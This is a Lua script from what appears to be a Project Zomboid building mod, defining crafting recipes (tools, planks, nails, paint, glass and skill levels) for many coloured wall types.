if not getBuildingMenuInstance then
    require("BuildingMenu01_Main")
end

---@class BuildingMenu
local BuildingMenu = getBuildingMenuInstance()

local function initBuildingMenuRecipes()
    local bigWallWoodCount = SandboxVars.BuildingMenuRecipes.bigWallWoodCount or 6
    local bigWallNailsCount = SandboxVars.BuildingMenuRecipes.bigWallNailsCount or 8

    local smallWallWoodCount = SandboxVars.BuildingMenuRecipes.smallWallWoodCount or 3
    local smallWallNailsCount = SandboxVars.BuildingMenuRecipes.smallWallNailsCount or 4


    local bigObjectsWoodCount = SandboxVars.BuildingMenuRecipes.bigObjectsWoodCount or 6
    local bigObjectsNailsCount = SandboxVars.BuildingMenuRecipes.bigObjectsNailsCount or 10

    local smallObjectsWoodCount = SandboxVars.BuildingMenuRecipes.smallObjectsWoodCount or 4
    local smallObjectsNailsCount = SandboxVars.BuildingMenuRecipes.smallObjectsNailsCount or 6


    local glassPaneCount = SandboxVars.BuildingMenuRecipes.glassPaneCount or 2

    local metalBarsCount = SandboxVars.BuildingMenuRecipes.metalBarsCount or 4

    local screwsCount = SandboxVars.BuildingMenuRecipes.screwsCount or 10

    local sheetMetalCountForWalls = SandboxVars.BuildingMenuRecipes.sheetMetalCountForWalls or 5
    local sheetMetalCountForDoors = SandboxVars.BuildingMenuRecipes.sheetMetalCountForDoors or 4
    local sheetMetalCountForContainers = SandboxVars.BuildingMenuRecipes.sheetMetalCountForDoors or 4
    local sheetMetalCountForFixturesAndAppliances = SandboxVars.BuildingMenuRecipes.sheetMetalCountForFixturesAndAppliances or 4
    local sheetMetalCountForRoofingAndFloors = SandboxVars.BuildingMenuRecipes.sheetMetalCountForRoofingAndFloors or 1


    local bigObjectsCarpentrySkill = SandboxVars.BuildingMenuRecipes.bigObjectsCarpentrySkill or 5
    local smallObjectsCarpentrySkill = SandboxVars.BuildingMenuRecipes.smallObjectsCarpentrySkill or 4
    local carpentryXpPerLevel = SandboxVars.BuildingMenuRecipes.carpentryXpPerLevel or 2.5
    local metalweldingXpPerLevel = SandboxVars.BuildingMenuRecipes.metalweldingXpPerLevel or 3.5
    local electricalXpPerLevel = SandboxVars.BuildingMenuRecipes.electricalXpPerLevel or 5.0


    local plankCountForMilitaryCrate = SandboxVars.BuildingMenuRecipes.plankCountForMilitaryCrate or 15
    local nailsCountForMilitaryCrate = SandboxVars.BuildingMenuRecipes.nailsCountForMilitaryCrate or 10
    local militaryCrateCarpentrySkill = SandboxVars.BuildingMenuRecipes.militaryCrateCarpentrySkill or 9


    BuildingMenu.GreyBigStoneWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintGrey",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.GreySmallStoneWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintGrey",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.GreenBigFabricWallRecipe = {
        neededTools = {
            "Hammer",
            "Needle",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.RippedSheets",
                Amount = 10
            },
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintGreen",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            },
            {
                Skill = "Tailoring",
                Level = 4,
                Xp = 15
            }
        }
    }

    BuildingMenu.GreenSmallFabricWallRecipe = {
        neededTools = {
            "Hammer",
            "Needle",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.RippedSheets",
                Amount = 6
            },
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintGreen",
                Amount = 1
            },        
            {
                Consumable = "Base.Thread",
                Amount = 5
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            },
            {
                Skill = "Tailoring",
                Level = 3,
                Xp = 10
            }
        }
    }


    BuildingMenu.YellowBigFabricWallRecipe = {
        neededTools = {
            "Hammer",
            "Needle",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.RippedSheets",
                Amount = 10
            },
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintYellow",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            },
            {
                Skill = "Tailoring",
                Level = 4,
                Xp = 15
            }
        }
    }

    BuildingMenu.YellowSmallFabricWallRecipe = {
        neededTools = {
            "Hammer",
            "Needle",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.RippedSheets",
                Amount = 6
            },
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintYellow",
                Amount = 1
            },        
            {
                Consumable = "Base.Thread",
                Amount = 5
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            },
            {
                Skill = "Tailoring",
                Level = 3,
                Xp = 10
            }
        }
    }

    BuildingMenu.TanBigStoneWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintLightBrown",
                Amount = 1
            },
            {
                Consumable = "Base.PaintWhite",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.TanSmallStoneWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintLightBrown",
                Amount = 1
            },
            {
                Consumable = "Base.PaintWhite",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.RedBigBrickWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintRed",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.RedSmallBrickWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintRed",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.OldBigBrickWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintBrown",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.OldSmallBrickWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintBrown",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.OrangeBigBrickWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintOrange",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.OrangeSmallBrickWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintOrange",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.BlueBigBrickWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintBlue",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.BlueSmallBrickWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintBlue",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.BeigeBigBrickWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintYellow",
                Amount = 1
            },
            {
                Consumable = "Base.PaintWhite",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.BeigeSmallBrickWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintYellow",
                Amount = 1
            },
            {
                Consumable = "Base.PaintWhite",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.WhiteBigBrickWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintWhite",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.WhiteSmallBrickWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintWhite",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.PurpleBigBrickWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintPurple",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.PurpleSmallBrickWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintPurple",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.GreenBigBrickWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintGreen",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.GreenSmallBrickWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintGreen",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.BrownBigBrickWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintBrown",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.BrownSmallBrickWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintBrown",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.BlueBigWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintBlue",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.BlueSmallWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintBlue",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.TanBigWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintLightBrown",
                Amount = 1
            },
            {
                Consumable = "Base.PaintWhite",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.TanSmallWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintLightBrown",
                Amount = 1
            },
            {
                Consumable = "Base.PaintWhite",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.PinkBigWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintPink",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.PinkSmallWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintPink",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.TurquoiseBigWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintTurquoise",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.TurquoiseSmallWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintTurquoise",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.TurquoiseBigBrickWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintTurquoise",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.TurquoiseSmallBrickWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintTurquoise",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.WhiteBigWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintWhite",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.WhiteSmallWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintWhite",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.YellowBigWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintYellow",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.YellowSmallWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintYellow",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.BrownBigWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintBrown",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.BrownBigWoodWindowWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            },
            {
                Material = "Base.GlassPane",
                Amount = glassPaneCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintBrown",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.BrownSmallWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintBrown",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.YellowBigWoodWindowWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            },
            {
                Material = "Base.GlassPane",
                Amount = glassPaneCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintYellow",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.BigWoodWallRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.SmallWoodWallRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.RedBigWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintRed",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.RedBigWindowWoodWallRecipe = {
        neededTools = {
            "Hammer",
            "Paintbrush"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            },
            {
                Material = "Base.GlassPane",
                Amount = glassPaneCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.PaintRed",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

